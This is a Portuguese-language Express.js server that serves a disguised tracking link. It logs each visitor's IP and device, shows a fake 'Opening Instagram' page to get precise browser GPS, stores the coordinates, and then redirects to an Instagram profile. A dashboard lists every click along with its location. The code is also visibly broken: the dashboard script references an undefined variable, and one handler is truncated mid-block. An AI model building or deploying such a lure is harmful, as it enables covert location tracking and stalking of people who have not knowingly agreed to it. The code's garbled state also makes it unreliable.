const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const clicks = [];
const gpsData = [];

// ROTA 1: Dashboard
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>📊 Dashboard de Rastreamento GPS</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 2rem;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          padding: 2rem;
          border-radius: 15px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
          margin-bottom: 2rem;
          text-align: center;
        }
        .header h1 { color: #333; margin-bottom: 1rem; font-size: 2rem; }
        .tracking-link {
          background: #667eea;
          color: white;
          padding: 1rem 2rem;
          border-radius: 10px;
          display: inline-block;
          margin-top: 1rem;
          text-decoration: none;
          font-weight: 600;
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
          gap: 1rem;
          margin-bottom: 2rem;
        }
        .stat-card {
          background: white;
          padding: 1.5rem;
          border-radius: 15px;
          text-align: center;
        }
        .stat-card h3 { color: #667eea; font-size: 2rem; }
        .clicks-container { display: grid; gap: 1.5rem; }
        .click-card {
          background: white;
          padding: 2rem;
          border-radius: 15px;
        }
        .click-card.with-gps { border-left: 5px solid #10b981; }
        .click-card.no-gps { border-left: 5px solid #ef4444; }
        .maps-link {
          display: inline-block;
          background: #10b981;
          color: white;
          padding: 0.8rem 1.5rem;
          border-radius: 8px;
          text-decoration: none;
          margin-top: 1rem;
          font-weight: 600;
        }
        .reload-btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 1rem 2rem;
          border-radius: 10px;
          cursor: pointer;
          font-size: 1rem;
          font-weight: 600;
          margin-bottom: 2rem;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📊 Dashboard de Rastreamento GPS</h1>
          <p>Monitore quem clica no seu link com localização precisa</p>
          <a href="/track" class="tracking-link" target="_blank">🔗 Link de Rastreamento</a>
        </div>
        <button class="reload-btn" onclick="loadData()">🔄 Atualizar</button>
        <div id="stats" class="stats"></div>
        <div id="clicks" class="clicks-container"></div>
      </div>
<script>
        const clickId = ${clickData.id};
        
        console.log('🔍 Iniciando captura de GPS...');
        console.log('Click ID:', clickId);
        
        if (navigator.geolocation) {
          console.log('✅ Geolocalização disponível no navegador');
          
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              console.log('✅ GPS capturado com sucesso!');
              console.log('📍 Latitude:', pos.coords.latitude);
              console.log('📍 Longitude:', pos.coords.longitude);
              console.log('🎯 Precisão:', pos.coords.accuracy, 'm');
              
              const gpsData = {
                clickId: clickId,
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                timestamp: new Date().toISOString()
              };
              
              console.log('📤 Enviando GPS para servidor...', gpsData);
              
              try {
                const response = await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify(gpsData)
                });
                
                const result = await response.json();
                console.log('✅ Resposta do servidor:', result);
                
                if (result.success) {
                  console.log('✅ GPS salvo com sucesso!');
                } else {
                  console.error('❌ Erro ao salvar GPS');
                }
              } catch (error) {
                console.error('❌ Erro ao enviar GPS:', error);
              }
              
              // Redireciona após enviar GPS
              console.log('🔄 Redirecionando para Instagram...');
              setTimeout(() => {
                window.location.href = 'https://www.instagram.com/andre.osantos12/';
              }, 1000);
            },
            (error) => {
              console.error('❌ Erro ao obter GPS:', error);
              console.log('Código do erro:', error.code);
              console.log('Mensagem:', error.message);
              
              // Códigos de erro:
              // 1 = PERMISSION_DENIED
              // 2 = POSITION_UNAVAILABLE
              // 3 = TIMEOUT
              
              setTimeout(() => {
                window.location.href = 'https://www.instagram.com/andre.osantos12/';
              }, 1500);
            },
            {
              enableHighAccuracy: true,
              timeout: 10000, // Aumentado para 10 segundos
              maximumAge: 0
            }
          );
        } else {
          console.error('❌ Geolocalização não disponível neste navegador');
          setTimeout(() => {
            window.location.href = 'https://www.instagram.com/andre.osantos12/';
          }, 1500);
        }
      </script>

    </body>
    </html>
  `);
});

// ROTA 2: Rastreamento /track
app.get('/track', (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
    referer: req.headers.referer || 'Direct',
    device: req.headers['user-agent'].includes('Mobile') ? 'Mobile' : 'Desktop'
  };
  
  clicks.push(clickData);
  console.log('📍 Clique:', clickData);
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Redirecionando...</title>
      <style>
        body {
          margin: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
          color: white;
          font-family: Arial;
          text-align: center;
        }
        .spinner {
          width: 50px;
          height: 50px;
          border: 5px solid rgba(255,255,255,0.3);
          border-top-color: white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
      </style>
    </head>
    <body>
      <div>
        <div class="spinner"></div>
        <h1>📷 Abrindo Instagram</h1>
        <p>Aguarde...</p>
      </div>
      <script>
        const clickId = ${clickData.id};
        
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              await fetch('/api/save-gps', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  clickId: clickId,
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  accuracy: pos.coords.accuracy
                })
              });
              window.location.href = 'https://www.instagram.com/andre.osantos12/';
            },
            () => {
              setTimeout(() => {
                window.location.href = 'https://www.instagram.com/andre.osantos12/';
              }, 1500);
            },
            {enableHighAccuracy: true, timeout: 5000}
          );
        } else {
          setTimeout(() => {
            window.location.href = 'https://www.instagram.com/andre.osantos12/';
          }, 1500);
        }
      </script>
    </body>
    </html>
  `);
});

// ROTA 3: Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  console.log('\n📥 Recebendo requisição de GPS...');
  console.log('Body recebido:', req.body);
  
  try {
    const gps = req.body;
    
    if (!gps || !gps.latitude || !gps.longitude) {
      console.error('❌ Dados de GPS inválidos:', gps);
      return res.status(400).json({success: false, error: 'Dados inválidos'});
    }
    
    gpsData.push(gps);
    console.log('✅ GPS adicionado ao array gpsData');
    
    const click = clicks.find(c => c.id === gps.clickId);
    console.log('🔍 Procurando click com ID:', gps.clickId);
    console.log('📊 Total de clicks no array:', clicks.length);
    
    if (click) {
      console.log('✅ Click encontrado!');
      click.gps = {
        lat: gps.latitude,
        lng: gps.longitude,
        accuracy: gps.accuracy
      };
      
      // ... resto do código de geolocalização ...
// ROTA 4: API Stats
app.get('/api/stats', (req, res) => {
  res.json({
    totalClicks: clicks.length,
    clicksComGPS: clicks.filter(c => c.gps).length,
    clicks: clicks
  });
});

// Inicia servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor na porta ${PORT}`);
});
